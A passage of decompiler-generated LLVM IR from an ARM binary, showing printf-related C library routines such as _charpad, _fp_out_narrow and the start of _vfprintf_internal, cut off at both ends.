  br i1 %v2_147c8, label %dec_label_pc_147c8..thread7_crit_edge, label %bb20

dec_label_pc_147c8..thread7_crit_edge:            ; preds = %dec_label_pc_147c8
  br label %.thread7

bb20:                                             ; preds = %dec_label_pc_147c8
  %v1_147d8 = load i32, i32* @r6, align 4
  %v3_147d8 = add i32 %v1_147d8, 28
  %v4_147d8 = inttoptr i32 %v3_147d8 to i32*
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_147c8..thread7_crit_edge, %bb20
  %v0_147e0.in = phi i32* [ @ip, %dec_label_pc_147c8..thread7_crit_edge ], [ %v4_147d8, %bb20 ]
  %v0_147e0 = load i32, i32* %v0_147e0.in, align 4
  %v2_147e0 = xor i1 %v2_147c8, true
  call void @__pseudo_cond_branch(i1 %v2_147e0, i32 %v0_147e0)
  %v0_147e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_147ec = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_147ec, i32* %r4.global-to-local, align 4
  ret i32 %v0_147e4

; uselistorder directives
  uselistorder i32 %v3_14728, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_147c8, { 1, 0 }
  uselistorder label %dec_label_pc_1478c, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_147f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_147f8:
  %v0_147f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_147f8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_147f8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_147f8, %bb
  %v10_14804 = phi i32 [ %arg1, %dec_label_pc_147f8 ], [ 0, %bb ]
  ret i32 %v10_14804

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_14808 = load i32, i32* @r4, align 4
  %v6_14808 = load i32, i32* @r5, align 4
  %v9_14808 = load i32, i32* @r6, align 4
  %v12_14808 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_14814 = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_14814, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_1482c2 = icmp eq i32 %arg3, 0
  br i1 %v2_1482c2, label %dec_label_pc_1484c, label %dec_label_pc_14840

dec_label_pc_14828:                               ; preds = %dec_label_pc_14840
  %v1_14828 = add i32 %v0_14828, -1
  store i32 %v1_14828, i32* @r4, align 4
  %v2_1482c = icmp eq i32 %v1_14828, 0
  %v0_14838 = load i32, i32* @r7, align 4
  br i1 %v2_1482c, label %dec_label_pc_1484c.loopexit, label %dec_label_pc_14840

dec_label_pc_14840:                               ; preds = %entry, %dec_label_pc_14828
  %v0_148384 = phi i32 [ %v0_14838, %dec_label_pc_14828 ], [ %arg1, %entry ]
  %v3_14840 = inttoptr i32 %v0_148384 to i16*
  %v4_14840 = call i32 @__stdio_fwrite(i32 %v10_14814, i32 1, i16* %v3_14840)
  %v7_14844 = icmp eq i32 %v4_14840, 1
  %v0_14828 = load i32, i32* @r4, align 4
  br i1 %v7_14844, label %dec_label_pc_14828, label %dec_label_pc_1484c.loopexit

dec_label_pc_1484c.loopexit:                      ; preds = %dec_label_pc_14828, %dec_label_pc_14840
  %v0_1484c.ph = phi i32 [ %v0_14828, %dec_label_pc_14840 ], [ 0, %dec_label_pc_14828 ]
  %v1_1484c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1484c

dec_label_pc_1484c:                               ; preds = %dec_label_pc_1484c.loopexit, %entry
  %v1_1484c = phi i32 [ 0, %entry ], [ %v1_1484c.pre, %dec_label_pc_1484c.loopexit ]
  %v0_1484c = phi i32 [ 0, %entry ], [ %v0_1484c.ph, %dec_label_pc_1484c.loopexit ]
  %v2_1484c = sub i32 %v1_1484c, %v0_1484c
  store i32 %v3_14808, i32* @r4, align 4
  store i32 %v6_14808, i32* @r5, align 4
  store i32 %v9_14808, i32* @r6, align 4
  store i32 %v12_14808, i32* @r7, align 4
  ret i32 %v2_1484c

; uselistorder directives
  uselistorder i32 %v1_14828, { 1, 0 }
  uselistorder label %dec_label_pc_1484c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14840, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1485c = load i32, i32* @r4, align 4
  store i32 %v3_1485c, i32* %stack_var_-24, align 4
  %v6_1485c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_14864 = and i32 %arg2, 128
  %v2_14864 = icmp eq i32 %v1_14864, 0
  %v0_14868 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14868, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_14864, label %dec_label_pc_148b8thread-pre-split, label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_14880 = call i32 @strlen(i8* %arg4)
  store i32 %v3_14880, i32* %r0.global-to-local, align 4
  %v1_14884 = load i32, i32* %r4.global-to-local, align 4
  %v2_14884 = sub i32 %v1_14884, %v3_14880
  store i32 %v2_14884, i32* @r4, align 4
  store i32 %v3_14880, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_14884, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_14898

.thread:                                          ; preds = %dec_label_pc_1487c
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148b4

dec_label_pc_14898:                               ; preds = %dec_label_pc_1487c
  %v0_14898 = load i32, i32* @r5, align 4
  %v1_14898 = urem i32 %v0_14898, 128
  %v0_1489c = load i32, i32* @r8, align 4
  store i32 %v0_1489c, i32* %r0.global-to-local, align 4
  %v3_148a4 = trunc i32 %v1_14898 to i8
  %v4_148a4 = call i32 @_charpad(i32 %v0_1489c, i8 %v3_148a4, i32 %v2_14884)
  store i32 %v4_148a4, i32* %r0.global-to-local, align 4
  %v1_148a8 = load i32, i32* @r4, align 4
  %v9_148a8 = icmp eq i32 %v4_148a4, %v1_148a8
  store i32 %v4_148a4, i32* %r5.global-to-local, align 4
  br i1 %v9_148a8, label %dec_label_pc_14898.dec_label_pc_148b4_crit_edge, label %dec_label_pc_148d4

dec_label_pc_14898.dec_label_pc_148b4_crit_edge:  ; preds = %dec_label_pc_14898
  %v0_148b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %.thread, %dec_label_pc_14898.dec_label_pc_148b4_crit_edge
  %v0_148b4 = phi i32 [ %v0_148b4.pre, %dec_label_pc_14898.dec_label_pc_148b4_crit_edge ], [ %v3_14880, %.thread ]
  store i32 %v0_148b4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_148b8

dec_label_pc_148b8thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148b8

dec_label_pc_148b8:                               ; preds = %dec_label_pc_148b8thread-pre-split, %dec_label_pc_148b4
  %v5_148c4 = phi i32 [ %arg3, %dec_label_pc_148b8thread-pre-split ], [ %v0_148b4, %dec_label_pc_148b4 ]
  %tmp14 = icmp slt i32 %v5_148c4, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_148b8
  br label %bb15

bb:                                               ; preds = %dec_label_pc_148b8
  %v5_148c0 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_148c0, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_19ef8.897 to i32))
  %v0_148d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_148d0 = add i32 %storemerge, %v0_148d0
  store i32 %v2_148d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_14898, %bb15
  %v0_148d4 = phi i32 [ %v4_148a4, %dec_label_pc_14898 ], [ %v2_148d0, %bb15 ]
  store i32 %v0_148d4, i32* %r0.global-to-local, align 4
  %v2_148d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_148d8, i32* %r4.global-to-local, align 4
  store i32 %v6_1485c, i32* %r5.global-to-local, align 4
  ret i32 %v0_148d4

; uselistorder directives
  uselistorder i32 %v0_148d4, { 1, 0 }
  uselistorder i32 %v0_148b4, { 1, 0 }
  uselistorder i32 %v2_14884, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_148d4, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_148b4, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_148e0 = load i32, i32* @r5, align 4
  %v9_148e0 = load i32, i32* @r6, align 4
  %v12_148e0 = load i32, i32* @r7, align 4
  %v18_148e0 = load i32, i32* @sb, align 4
  %v21_148e0 = load i32, i32* @sl, align 4
  %v24_148e0 = load i32, i32* @fp, align 4
  %v2_148e8 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_148e8, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_148e8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_148f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_148f8, i32* @r5, align 4
  %v2_148fc = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_148fc, i32* %r0.global-to-local, align 4
  %v1_14904 = icmp slt i32 %v2_148fc, 0
  br i1 %v1_14904, label %dec_label_pc_14914, label %dec_label_pc_14948

dec_label_pc_14914:                               ; preds = %entry
  %v3_14914 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_14914, i32* @r4, align 4
  %v1_14918 = inttoptr i32 %v3_14914 to i8*
  store i32 %v3_14914, i32* %r0.global-to-local, align 4
  %v3_1491c = call i32 @strlen(i8* %v1_14918)
  store i32 %v3_1491c, i32* %r0.global-to-local, align 4
  %v2_14920 = icmp eq i32 %v3_1491c, 0
  br i1 %v2_14920, label %bb, label %dec_label_pc_14930

bb:                                               ; preds = %dec_label_pc_14914
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f98

dec_label_pc_14930:                               ; preds = %dec_label_pc_14914
  %v0_14930 = load i32, i32* @r4, align 4
  store i32 %v0_14930, i32* %r0.global-to-local, align 4
  %v0_14934 = load i32, i32* @fp, align 4
  store i32 %v0_14934, i32* %r2.global-to-local, align 4
  %v3_14938 = inttoptr i32 %v0_14934 to i16*
  %v4_14938 = call i32 @__stdio_fwrite(i32 %v0_14930, i32 %v3_1491c, i16* %v3_14938)
  store i32 %v4_14938, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14f98

dec_label_pc_14948:                               ; preds = %entry
  %v0_14948 = load i32, i32* @r5, align 4
  store i32 %v2_148e8, i32* %r0.global-to-local, align 4
  %v2_14950 = call i32 @_ppfs_prepargs(i32 %v2_148e8, i32 %v0_14948)
  store i32 %v2_14950, i32* %r0.global-to-local, align 4
  store i32 860, i32* @ip, align 4
  %v0_14998 = load i32, i32* @r4, align 4
  store i32 %v0_14998, i32* %r2.global-to-local, align 4
  %v1_14a1c = bitcast i32* %stack_var_-352 to i8*
  %v4_14a2c = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_14a38 = ptrtoint i32* %stack_var_-272 to i32
  %v2_14a50 = ptrtoint i32* %stack_var_-40 to i32
  %v2_14a6c = icmp eq i32 %tmp104, 0
  %v2_14da4 = ptrtoint i32* %stack_var_-200 to i32
  %v2_14de8 = ptrtoint i32* %stack_var_-348 to i32
  %v2_14dec = ptrtoint i32* %stack_var_-72 to i32
  %v2_14ca0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_14cac = ptrtoint i32* %stack_var_-52 to i32
  %v7_14b08 = zext i8 %tmp102 to i32
  %v2_14b40 = ptrtoint i32* %stack_var_-73 to i32
  %v1_14b48 = bitcast i32* %stack_var_-73 to i8*
  %v2_14b50 = icmp ugt i32 %tmp104, 4
  %v7_14b50 = icmp eq i32 %tmp104, 5
  %v7_14a34 = ptrtoint i32* %stack_var_-280 to i32
  %v5_14a64195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_14c74 = icmp ugt i32 %tmp104, 16
  %v7_14c74 = icmp eq i32 %tmp104, 17
  %v2_14c78 = xor i1 %v7_14c74, true
  %v3_14c78 = and i1 %v2_14c74, %v2_14c78
  %v2_14cfc = icmp ugt i32 %tmp104, 18
  %v7_14cfc = icmp eq i32 %tmp104, 19
  %v2_14d00 = xor i1 %v7_14cfc, true
  %v3_14d00 = and i1 %v2_14cfc, %v2_14d00
  %v7_14d98 = icmp eq i32 %tmp104, 20
  %v1_14ab0 = add i32 %tmp104, add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -37205)
  %v2_14ab0 = inttoptr i32 %v1_14ab0 to i8*
  %v2_14adc = xor i1 %v7_14b50, true
  %v3_14adc = and i1 %v2_14b50, %v2_14adc
  %v7_14b10 = icmp eq i32 %tmp104, 1
  %v2_14b58 = xor i1 %v2_14b50, true
  %v3_14b58 = or i1 %v7_14b50, %v2_14b58
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_14bc0 = icmp eq i32 %tmp104, 3
  %v11_14bcc = icmp eq i32 %tmp104, 4
  %v9_14a3c = mul nuw nsw i32 %v4_14a2c, 8
  %v10_14a3c = add i32 %v7_14a34, %v9_14a3c
  br label %dec_label_pc_1499c.outer

dec_label_pc_1499c.outer:                         ; preds = %dec_label_pc_14f7c, %dec_label_pc_14948
  %v0_1499c45 = phi i32 [ %v3_14f7c, %dec_label_pc_14f7c ], [ %v0_14998, %dec_label_pc_14948 ]
  %v0_14ad0 = phi i32 [ %stack_var_-336.4, %dec_label_pc_14f7c ], [ %tmp103, %dec_label_pc_14948 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_14f7c ], [ 0, %dec_label_pc_14948 ]
  br label %dec_label_pc_1499c.outer36

dec_label_pc_1499c.outer36:                       ; preds = %dec_label_pc_1499c.outer, %dec_label_pc_14f88
  %v0_1499c44 = phi i32 [ %v0_1499c45, %dec_label_pc_1499c.outer ], [ %v1_14f88, %dec_label_pc_14f88 ]
  %v5_149c8 = phi i32 [ %v0_1499c45, %dec_label_pc_1499c.outer ], [ %v1_149f8, %dec_label_pc_14f88 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_1499c.outer ], [ %v1_14e68, %dec_label_pc_14f88 ]
  %v1_1499c188 = inttoptr i32 %v0_1499c44 to i8*
  %v2_1499c189 = load i8, i8* %v1_1499c188, align 1
  %v2_149a0191 = icmp eq i8 %v2_1499c189, 0
  br i1 %v2_149a0191, label %dec_label_pc_149b8, label %bb138

bb138:                                            ; preds = %dec_label_pc_1499c.outer36, %.thread6
  %v2_1499c193 = phi i8 [ %v2_1499c, %.thread6 ], [ %v2_1499c189, %dec_label_pc_1499c.outer36 ]
  %v1_149b0192 = phi i32 [ %v2_149b0, %.thread6 ], [ %v0_1499c44, %dec_label_pc_1499c.outer36 ]
  %v8_149a4 = icmp eq i8 %v2_1499c193, 37
  br i1 %v8_149a4, label %dec_label_pc_149b8, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_149b0 = add i32 %v1_149b0192, 1
  store i32 %v2_149b0, i32* @r4, align 4
  %v1_1499c = inttoptr i32 %v2_149b0 to i8*
  %v2_1499c = load i8, i8* %v1_1499c, align 1
  %v2_149a0 = icmp eq i8 %v2_1499c, 0
  br i1 %v2_149a0, label %dec_label_pc_149b8, label %bb138

dec_label_pc_149b8:                               ; preds = %bb138, %.thread6, %dec_label_pc_1499c.outer36
  %v1_149b0.lcssa = phi i32 [ %v0_1499c44, %dec_label_pc_1499c.outer36 ], [ %v2_149b0, %.thread6 ], [ %v1_149b0192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_149b8 = sub i32 %v1_149b0.lcssa, %v5_149c8
  %v9_149b8 = icmp eq i32 %v1_149b0.lcssa, %v5_149c8
  br i1 %v9_149b8, label %dec_label_pc_149ec, label %dec_label_pc_149c0

dec_label_pc_149c0:                               ; preds = %dec_label_pc_149b8
  store i32 %v2_149b8, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_149b8, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_149c0
  store i32 %v5_149c8, i32* %r0.global-to-local, align 4
  %v5_149d0 = load i32, i32* @fp, align 4
  store i32 %v5_149d0, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_149c0, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_149c0 ]
  store i32 84440, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_19ef8.897 to i32))
  %v0_149d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_149d8 = load i32, i32* @r5, align 4
  %v9_149d8 = icmp eq i32 %v0_149d8, %v1_149d8
  br i1 %v9_149d8, label %dec_label_pc_149e0, label %dec_label_pc_14f90

dec_label_pc_149e0:                               ; preds = %bb142
  %v2_149e4 = add i32 %v0_149d8, %stack_var_-356.1.ph37
  store i32 %v2_149e4, i32* @ip, align 4
  %v0_149ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_149ec

dec_label_pc_149ec:                               ; preds = %dec_label_pc_149b8, %dec_label_pc_149e0
  %v0_14a00 = phi i32 [ %v5_149c8, %dec_label_pc_149b8 ], [ %v0_149ec.pre, %dec_label_pc_149e0 ]
  %v1_14e68 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_149b8 ], [ %v2_149e4, %dec_label_pc_149e0 ]
  %v1_149ec = inttoptr i32 %v0_14a00 to i8*
  %v2_149ec = load i8, i8* %v1_149ec, align 1
  %v2_149f0 = icmp eq i8 %v2_149ec, 0
  br i1 %v2_149f0, label %dec_label_pc_14f98, label %dec_label_pc_149f8

dec_label_pc_149f8:                               ; preds = %dec_label_pc_149ec
  %v1_149f8 = add i32 %v0_14a00, 1
  %v2_149f8 = inttoptr i32 %v1_149f8 to i8*
  %v3_149f8 = load i8, i8* %v2_149f8, align 1
  %v7_149fc = icmp eq i8 %v3_149f8, 37
  store i32 %v1_149f8, i32* %r2.global-to-local, align 4
  br i1 %v7_149fc, label %dec_label_pc_14f88, label %dec_label_pc_14a08

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149f8
  store i32 %v2_148e8, i32* @r4, align 4
  store i32 %v2_148e8, i32* %r0.global-to-local, align 4
  store i32 %v1_149f8, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_14a1c = call i32 @_ppfs_parsespec(i8* %v1_14a1c)
  store i32 %v2_148e8, i32* @r0, align 4
  %v0_14a24 = call i32 @_ppfs_setargs()
  store i32 %v0_14a24, i32* %r0.global-to-local, align 4
  store i32 %v4_14a2c, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_14a08
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_14a08, %bb145
  %storemerge = phi i32 [ %v10_14a3c, %bb145 ], [ %v7_14a38, %dec_label_pc_14a08 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_14a64195, label %dec_label_pc_14a48, label %dec_label_pc_14a68

dec_label_pc_14a48:                               ; preds = %bb146, %dec_label_pc_14a48
  %v5_14a54197 = phi i32 [ %v5_14a54, %dec_label_pc_14a48 ], [ %v2_14a50, %bb146 ]
  %v0_14a48196 = phi i32 [ %v1_14a4c, %dec_label_pc_14a48 ], [ %storemerge, %bb146 ]
  %v2_14a48 = add i32 %v5_14a54197, -32
  %v3_14a48 = inttoptr i32 %v2_14a48 to i32*
  store i32 %v0_14a48196, i32* %v3_14a48, align 4
  %v0_14a4c = load i32, i32* %r0.global-to-local, align 4
  %v1_14a4c = add i32 %v0_14a4c, 8
  store i32 %v1_14a4c, i32* %r0.global-to-local, align 4
  %v1_14a54.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14a54 = mul i32 %v1_14a54.pre, 4
  %v5_14a54 = add i32 %v4_14a54, %v2_14a50
  %v1_14a60 = add i32 %v1_14a54.pre, 1
  store i32 %v1_14a60, i32* %r2.global-to-local, align 4
  %v5_14a64 = icmp slt i32 %v1_14a54.pre, %tmp105
  br i1 %v5_14a64, label %dec_label_pc_14a48, label %dec_label_pc_14a68

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a48, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_14a6c, label %dec_label_pc_14a74, label %dec_label_pc_14a98

dec_label_pc_14a74:                               ; preds = %dec_label_pc_14a68
  %v3_14a74 = load i32, i32* %stack_var_-72, align 4
  store i32 %v1_14e68, i32* @ip, align 4
  %v1_14a80 = inttoptr i32 %v3_14a74 to i32*
  %v2_14a80 = load i32, i32* %v1_14a80, align 4
  store i32 %v2_14a80, i32* %r0.global-to-local, align 4
  %v1_14a84 = and i32 %v0_14ad0, 3840
  store i32 %v1_14e68, i32* %r2.global-to-local, align 4
  %v3_14a8c = ashr i32 %v1_14e68, 31
  %v4_14a90 = inttoptr i32 %v2_14a80 to i16*
  %v5_14a90 = call i32 @_store_inttype(i16* %v4_14a90, i32 %v1_14a84, i32 %v1_14e68, i32 %v3_14a8c)
  store i32 %v5_14a90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14f7c

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a68
  br i1 %tmp207, label %dec_label_pc_14c34, label %dec_label_pc_14aa0

dec_label_pc_14aa0:                               ; preds = %dec_label_pc_14a98
  %v3_14ab0 = load i8, i8* %v2_14ab0, align 1
  %v4_14ab0 = zext i8 %v3_14ab0 to i32
  %v7_14ab4 = icmp eq i8 %v3_14ab0, 10
  br i1 %v7_14ab4, label %dec_label_pc_14ac0, label %bb147

bb147:                                            ; preds = %dec_label_pc_14aa0
  br label %bb151

dec_label_pc_14ac0:                               ; preds = %dec_label_pc_14aa0
  %v1_14ad0 = and i32 %v0_14ad0, 64
  %v2_14ad0 = icmp eq i32 %v1_14ad0, 0
  br i1 %v2_14ad0, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_14ac0
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_14ac0, %bb150
  br i1 %v3_14adc, label %.thread, label %dec_label_pc_14ae4

.thread:                                          ; preds = %bb151
  %v5_14adc = sub nsw i32 0, %v4_14ab0
  br label %dec_label_pc_14afc

dec_label_pc_14ae4:                               ; preds = %bb151
  br i1 %v7_14bc0, label %bb152, label %dec_label_pc_14af0

bb152:                                            ; preds = %dec_label_pc_14ae4
  br label %dec_label_pc_14afc

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14ae4
  br i1 %v7_14b10, label %dec_label_pc_14b00, label %dec_label_pc_14afc

dec_label_pc_14afc:                               ; preds = %.thread, %bb152, %dec_label_pc_14af0
  %v0_14b2881 = phi i32 [ %v5_14adc, %.thread ], [ %v4_14ab0, %bb152 ], [ %v4_14ab0, %dec_label_pc_14af0 ]
  br label %dec_label_pc_14b00

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af0, %dec_label_pc_14afc
  %v0_14b2880 = phi i32 [ %v0_14b2881, %dec_label_pc_14afc ], [ %v4_14ab0, %dec_label_pc_14af0 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_14afc ], [ 6, %dec_label_pc_14af0 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_14b00 = load i32, i32* %stack_var_-348, align 4
  %v1_14b04 = icmp slt i32 %v3_14b00, 0
  %v7_14b08. = select i1 %v1_14b04, i32 %v7_14b08, i32 32
  store i32 %v7_14b08., i32* @sb, align 4
  br i1 %v7_14b10, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_14b00
  store i32 %v2_14a50, i32* %r2.global-to-local, align 4
  %v2_14b18 = load i32, i32* @ip, align 4
  %v5_14b18 = mul i32 %v2_14b18, 4
  %v6_14b18 = add i32 %v5_14b18, %v2_14a50
  %v2_14b1c = add i32 %v6_14b18, -276
  %v3_14b1c = inttoptr i32 %v2_14b1c to i32*
  %v4_14b1c = load i32, i32* %v3_14b1c, align 4
  %v2_14b24 = and i32 %v4_14b1c, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_14b00, %.thread15
  %storemerge93 = phi i32 [ %v2_14b24, %.thread15 ], [ 1024, %dec_label_pc_14b00 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_14b2880, i32* @r2, align 4
  %v3_14b2c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14b2c, i32* @r1, align 4
  %v0_14b30 = call i32 @_load_inttype()
  store i32 %v0_14b30, i32* @r2, align 4
  %v0_14b3c = load i32, i32* @r1, align 4
  store i32 %v0_14b3c, i32* @r3, align 4
  store i32 %v2_14b40, i32* %r0.global-to-local, align 4
  %v2_14b48 = call i32 @_uintmaxtostr(i8* %v1_14b48)
  store i32 %v2_14b48, i32* %r0.global-to-local, align 4
  store i32 %v2_14b48, i32* @r4, align 4
  br i1 %v3_14b58, label %bb160, label %dec_label_pc_14b5c

dec_label_pc_14b5c:                               ; preds = %bb157
  %v3_14b48 = inttoptr i32 %v2_14b48 to i8*
  %v3_14b5c = load i8, i8* %v3_14b48, align 1
  %v7_14b60 = icmp eq i8 %v3_14b5c, 45
  %v2_14b68 = or i32 %v0_14ad0, 2
  %v2_14b68.stack_var_-336.0 = select i1 %v7_14b60, i32 %v2_14b68, i32 %v0_14ad0
  br i1 %v7_14b60, label %.thread17, label %dec_label_pc_14b7c

.thread17:                                        ; preds = %dec_label_pc_14b5c
  %v3_14b6c = add i32 %v2_14b48, 1
  store i32 %v3_14b6c, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_14b7c:                               ; preds = %dec_label_pc_14b5c
  %v1_14b7c = and i32 %v2_14b68.stack_var_-336.0, 2
  %v2_14b7c = icmp eq i32 %v1_14b7c, 0
  br i1 %v2_14b7c, label %dec_label_pc_14b88, label %bb158

bb158:                                            ; preds = %dec_label_pc_14b7c
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_14b88:                               ; preds = %dec_label_pc_14b7c
  %v1_14b88 = urem i32 %v2_14b68.stack_var_-336.0, 2
  %v2_14b88 = icmp eq i32 %v1_14b88, 0
  br i1 %v2_14b88, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_14b88
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_14b88, %bb159
  %v0_14be4 = phi i32 [ %v2_14b48, %bb157 ], [ %v3_14b6c, %.thread17 ], [ %v2_14b48, %dec_label_pc_14b88 ], [ %v2_14b48, %bb159 ], [ %v2_14b48, %bb158 ]
